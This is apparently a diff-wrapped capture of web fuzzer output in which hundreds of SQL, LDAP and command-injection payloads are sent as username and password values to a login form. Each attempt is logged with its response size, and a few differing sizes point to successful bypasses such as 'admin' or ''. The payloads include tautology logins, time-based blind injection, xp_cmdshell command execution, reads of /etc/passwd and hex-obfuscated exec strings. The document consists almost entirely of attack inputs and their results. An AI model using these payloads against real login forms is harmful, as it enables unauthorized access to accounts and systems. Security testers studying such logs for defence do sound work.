@@ -1,0 +1,1068 @@
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: (||6)
+[2K    * UNAME: (||6)
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: distinct
+[2K    * PASS: distinct
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: 23 OR 1=1
+[2K    * UNAME: 23 OR 1=1
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ; execute immediate 'sel' || 'ect us' || 'er'
+[2K    * PASS: ; execute immediate 'sel' || 'ect us' || 'er'
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS:  or 0=0 #
+[2K    * UNAME:  or 0=0 #
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: %20or%201=1
+[2K    * PASS: %20or%201=1
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: 1 or sleep(__TIME__)#
+[2K    * PASS: 1 or sleep(__TIME__)#
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: " or pg_sleep(__TIME__)--
+[2K    * PASS: " or pg_sleep(__TIME__)--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: exec sp
+[2K    * PASS: exec sp
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: %20$(sleep%2050)
+[2K    * PASS: %20$(sleep%2050)
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ) or benchmark(10000000,MD5(1))#
+[2K    * PASS: ) or benchmark(10000000,MD5(1))#
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: 0x730065006c0065006300740020004000400076006500 ...
+[2K    * PASS: 0x730065006c0065006300740020004000400076006500 ...
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+[2K    * PASS: ||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ; exec master..xp_cmdshell
+[2K    * PASS: ; exec master..xp_cmdshell
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: @var select @var as var into temp end --
+[2K    * PASS: @var select @var as var into temp end --
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS:  or a=a--
+[2K    * UNAME:  or a=a--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: *(|(objectclass=*))
+[2K    * PASS: *(|(objectclass=*))
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: # from wapiti
+[2K    * PASS: # from wapiti
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: );waitfor delay '0:0:__TIME__'--
+[2K    * PASS: );waitfor delay '0:0:__TIME__'--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: pg_sleep(__TIME__)--
+[2K    * UNAME: pg_sleep(__TIME__)--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ||6
+[2K    * PASS: ||6
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: )) or pg_sleep(__TIME__)--
+[2K    * PASS: )) or pg_sleep(__TIME__)--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: declare @s varchar (200) select @s = 0x73656c6 ...
+[2K    * PASS: declare @s varchar (200) select @s = 0x73656c6 ...
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or 1=1--
+[2K    * PASS:  or 1=1--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: &
+[2K    * UNAME: &
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: as
+[2K    * PASS: as
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: order by
+[2K    * UNAME: order by
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: sqlvuln
+[2K    * PASS: sqlvuln
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: Ã½ or 1=1 --
+[2K    * PASS: Ã½ or 1=1 --
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: 1)) or benchmark(10000000,MD5(1))#
+[2K    * PASS: 1)) or benchmark(10000000,MD5(1))#
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: ");waitfor delay '0:0:__TIME__'--
+[2K    * UNAME: ");waitfor delay '0:0:__TIME__'--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or 2 between 1 and 3
+[2K    * PASS:  or 2 between 1 and 3
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: /
+[2K    * PASS: /
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: a'
+[2K    * PASS: a'
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: x' AND 1=(SELECT COUNT(*) FROM tabname); --
+[2K    * PASS: x' AND 1=(SELECT COUNT(*) FROM tabname); --
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: \x27UNION SELECT
+[2K    * PASS: \x27UNION SELECT
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: )%20or%20('x'='x
+[2K    * PASS: )%20or%20('x'='x
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: password:*/=1--
+[2K    * PASS: password:*/=1--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: having
+[2K    * PASS: having
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: hi or a=a
+[2K    * PASS: hi or a=a
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: +sqlvuln
+[2K    * PASS: +sqlvuln
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: hi or 1=1 --"
+[2K    * PASS: hi or 1=1 --"
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ) or pg_sleep(__TIME__)--
+[2K    * PASS: ) or pg_sleep(__TIME__)--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: x' AND members.email IS NULL; --
+[2K    * PASS: x' AND members.email IS NULL; --
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: %27%20or%201=1
+[2K    * UNAME: %27%20or%201=1
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: declare @q nvarchar (4000) select @q =
+[2K    * PASS: declare @q nvarchar (4000) select @q =
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: delete
+[2K    * PASS: delete
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: update
+[2K    * PASS: update
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: or 0=0 --
+[2K    * PASS: or 0=0 --
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or 'unusual' = 'unusual'
+[2K    * PASS:  or 'unusual' = 'unusual'
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: declare @q nvarchar (200) 0x730065006c00650063 ...
+[2K    * UNAME: declare @q nvarchar (200) 0x730065006c00650063 ...
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: replace
+[2K    * PASS: replace
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: exec(@s)
+[2K    * UNAME: exec(@s)
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: truncate
+[2K    * PASS: truncate
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ") or pg_sleep(__TIME__)--
+[2K    * PASS: ") or pg_sleep(__TIME__)--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: (sqlattempt2)
+[2K    * PASS: (sqlattempt2)
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: or isNULL(1/0) /*
+[2K    * PASS: or isNULL(1/0) /*
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: 1) or benchmark(10000000,MD5(1))#
+[2K    * PASS: 1) or benchmark(10000000,MD5(1))#
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: 28 %
+[2K    * PASS: 28 %
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: 1 waitfor delay '0:0:10'--
+[2K    * PASS: 1 waitfor delay '0:0:10'--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ||UTL_HTTP.REQUEST
+[2K    * PASS: ||UTL_HTTP.REQUEST
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: @variable
+[2K    * PASS: @variable
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  union select 1,load_file('/etc/passwd'),1,1,1;
+[2K    * PASS:  union select 1,load_file('/etc/passwd'),1,1,1;
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  -- &password=
+[2K    * PASS:  -- &password=
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: exec xp
+[2K    * PASS: exec xp
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: to_timestamp_tz
+[2K    * UNAME: to_timestamp_tz
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or ''='
+[2K    * PASS:  or ''='
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ; exec xp_regread
+[2K    * PASS: ; exec xp_regread
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS:  or 'something' = 'some'+'thing'
+[2K    * UNAME:  or 'something' = 'some'+'thing'
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ; begin declare @var varchar(8000) set @var=' ...
+[2K    * PASS: ; begin declare @var varchar(8000) set @var=' ...
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: â or 3=3 --
+[2K    * UNAME: â or 3=3 --
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: 0x770061006900740066006F0072002000640065006C00 ...
+[2K    * UNAME: 0x770061006900740066006F0072002000640065006C00 ...
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: 1) or sleep(__TIME__)#
+[2K    * PASS: 1) or sleep(__TIME__)#
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: %20or%20x=x
+[2K    * UNAME: %20or%20x=x
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or pg_sleep(__TIME__)--
+[2K    * PASS:  or pg_sleep(__TIME__)--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ")) or sleep(__TIME__)="
+[2K    * PASS: ")) or sleep(__TIME__)="
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: 1)) or pg_sleep(__TIME__)--
+[2K    * UNAME: 1)) or pg_sleep(__TIME__)--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: //
+[2K    * UNAME: //
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: ; or '1'='1'
+[2K    * UNAME: ; or '1'='1'
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  (select top 1
+[2K    * PASS:  (select top 1
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: x' AND email IS NULL; --
+[2K    * PASS: x' AND email IS NULL; --
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: %20or%20'x'='x
+[2K    * UNAME: %20or%20'x'='x
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS:  union select
+[2K    * UNAME:  union select
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: " or 1=1--
+[2K    * PASS: " or 1=1--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or sleep(__TIME__)='
+[2K    * PASS:  or sleep(__TIME__)='
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: 0
+[2K    * PASS: 0
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: or 0=0 #"
+[2K    * PASS: or 0=0 #"
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ,@variable
+[2K    * PASS: ,@variable
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or 1 in (select @@version)--
+[2K    * PASS:  or 1 in (select @@version)--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: asc
+[2K    * PASS: asc
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: /**/or/**/1/**/=/**/1
+[2K    * UNAME: /**/or/**/1/**/=/**/1
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: %2A%28%7C%28objectclass%3D%2A%29%29
+[2K    * PASS: %2A%28%7C%28objectclass%3D%2A%29%29
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  select name from syscolumns where id = (sele ...
+[2K    * PASS:  select name from syscolumns where id = (sele ...
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: " or 0=0 --
+[2K    * PASS: " or 0=0 --
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: "));waitfor delay '0:0:__TIME__'--
+[2K    * PASS: "));waitfor delay '0:0:__TIME__'--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or 1=1 or ''='
+[2K    * PASS:  or 1=1 or ''='
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: 3.10E+17
+[2K    * PASS: 3.10E+17
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: or a = a
+[2K    * PASS: or a = a
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: insert
+[2K    * UNAME: insert
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: %20or%20''='
+[2K    * PASS: %20or%20''='
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  group by userid having 1=1--
+[2K    * PASS:  group by userid having 1=1--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: hi' or 1=1 --
+[2K    * PASS: hi' or 1=1 --
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  having 1=1--
+[2K    * PASS:  having 1=1--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: "hi"") or (""a""=""a"
+[2K    * PASS: "hi"") or (""a""=""a"
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  UNION SELECT
+[2K    * PASS:  UNION SELECT
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: a' or 1=1--
+[2K    * PASS: a' or 1=1--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ) or (a=a
+[2K    * PASS: ) or (a=a
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: %20'sleep%2050'
+[2K    * PASS: %20'sleep%2050'
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: desc
+[2K    * UNAME: desc
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ||'6
+[2K    * PASS: ||'6
+
+[32m[2K[Status: 200, Size: 607, Words: 5, Lines: 1][0m
+[2K    * UNAME: x' or 1=1 or 'x'='y
+[2K    * PASS: x' or 1=1 or 'x'='y
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: %2A%28%7C%28mail%3D%2A%29%29
+[2K    * UNAME: %2A%28%7C%28mail%3D%2A%29%29
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: 1;(load_file(char(47,101,116,99,47,112,97,115, ...
+[2K    * PASS: 1;(load_file(char(47,101,116,99,47,112,97,115, ...
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: ; exec ('sel' + 'ect us' + 'er')
+[2K    * UNAME: ; exec ('sel' + 'ect us' + 'er')
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: 1 or benchmark(10000000,MD5(1))#
+[2K    * UNAME: 1 or benchmark(10000000,MD5(1))#
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ; exec master..xp_cmdshell 'ping 172.10.1.255'--
+[2K    * PASS: ; exec master..xp_cmdshell 'ping 172.10.1.255'--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: 26 %
+[2K    * PASS: 26 %
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  union all select @@version--
+[2K    * PASS:  union all select @@version--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  select * from information_schema.tables--
+[2K    * PASS:  select * from information_schema.tables--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  and 1=( if((load_file(char(110,46,101,120,11 ...
+[2K    * PASS:  and 1=( if((load_file(char(110,46,101,120,11 ...
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: &apos;%20OR
+[2K    * PASS: &apos;%20OR
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: declare @s varchar(22) select @s =
+[2K    * PASS: declare @s varchar(22) select @s =
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: !
+[2K    * PASS: !
+
+[32m[2K[Status: 200, Size: 607, Words: 5, Lines: 1][0m
+[2K    * PASS: hi' or 'x'='x';
+[2K    * UNAME: hi' or 'x'='x';
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ?
+[2K    * PASS: ?
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  UNION ALL SELECT
+[2K    * PASS:  UNION ALL SELECT
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or 1/*
+[2K    * PASS:  or 1/*
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or benchmark(10000000,MD5(1))#
+[2K    * PASS:  or benchmark(10000000,MD5(1))#
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: declare @q nvarchar (200) select @q = 0x770061 ...
+[2K    * PASS: declare @q nvarchar (200) select @q = 0x770061 ...
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or 1 --'
+[2K    * PASS:  or 1 --'
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: //*
+[2K    * UNAME: //*
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS:  or 3=3
+[2K    * UNAME:  or 3=3
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: 29 %
+[2K    * PASS: 29 %
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: select
+[2K    * PASS: select
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: 0x77616974666F722064656C61792027303A303A313027 ...
+[2K    * PASS: 0x77616974666F722064656C61792027303A303A313027 ...
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  --
+[2K    * PASS:  --
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ") or benchmark(10000000,MD5(1))#
+[2K    * PASS: ") or benchmark(10000000,MD5(1))#
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or 'text' > 't'
+[2K    * PASS:  or 'text' > 't'
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ")) or benchmark(10000000,MD5(1))#
+[2K    * PASS: ")) or benchmark(10000000,MD5(1))#
+
+[32m[2K[Status: 200, Size: 607, Words: 5, Lines: 1][0m
+[2K    * UNAME: admin' or '
+[2K    * PASS: admin' or '
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: '
+[2K    * PASS: '
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: benchmark(10000000,MD5(1))#
+[2K    * PASS: benchmark(10000000,MD5(1))#
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: a' or 'a' = 'a
+[2K    * UNAME: a' or 'a' = 'a
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: like
+[2K    * PASS: like
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: uni/**/on sel/**/ect
+[2K    * PASS: uni/**/on sel/**/ect
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: */*
+[2K    * PASS: */*
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: " or benchmark(10000000,MD5(1))#
+[2K    * PASS: " or benchmark(10000000,MD5(1))#
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or a = a
+[2K    * PASS:  or a = a
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: " or isNULL(1/0) /*
+[2K    * PASS: " or isNULL(1/0) /*
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: t'exec master..xp_cmdshell 'nslookup www.googl ...
+[2K    * PASS: t'exec master..xp_cmdshell 'nslookup www.googl ...
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or 'whatever' in ('whatever')
+[2K    * PASS:  or 'whatever' in ('whatever')
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: "a"" or 1=1--"
+[2K    * PASS: "a"" or 1=1--"
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: or%201=1
+[2K    * PASS: or%201=1
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: 21 %
+[2K    * PASS: 21 %
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: â or 1=1 --
+[2K    * UNAME: â or 1=1 --
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or '1'='1
+[2K    * PASS:  or '1'='1
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: )) or sleep(__TIME__)='
+[2K    * PASS: )) or sleep(__TIME__)='
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: char%4039%41%2b%40SELECT
+[2K    * PASS: char%4039%41%2b%40SELECT
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: sqlvuln;
+[2K    * PASS: sqlvuln;
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: declare @s varchar (8000) select @s = 0x73656c ...
+[2K    * PASS: declare @s varchar (8000) select @s = 0x73656c ...
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: a' or 3=3--
+[2K    * PASS: a' or 3=3--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: or 1=1 or ""=
+[2K    * UNAME: or 1=1 or ""=
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: or a=a
+[2K    * PASS: or a=a
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: PRINT @@variable
+[2K    * PASS: PRINT @@variable
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or 0=0 --
+[2K    * PASS:  or 0=0 --
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: or 1=1
+[2K    * UNAME: or 1=1
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: ')%20or%20('x'='x
+[2K    * UNAME: ')%20or%20('x'='x
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS:  or sleep(__TIME__)#
+[2K    * UNAME:  or sleep(__TIME__)#
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+[2K    * UNAME: declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+[2K    * UNAME: declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)
+[2K    * PASS: declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ") or sleep(__TIME__)="
+[2K    * PASS: ") or sleep(__TIME__)="
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or (EXISTS)
+[2K    * PASS:  or (EXISTS)
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or a=a
+[2K    * PASS:  or a=a
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: or
+[2K    * PASS: or
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: 'hi' or 'x'='x';
+[2K    * PASS: 'hi' or 'x'='x';
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: %7C
+[2K    * PASS: %7C
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ' or 1=1
+[2K    * PASS: ' or 1=1
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or 0=0 #"
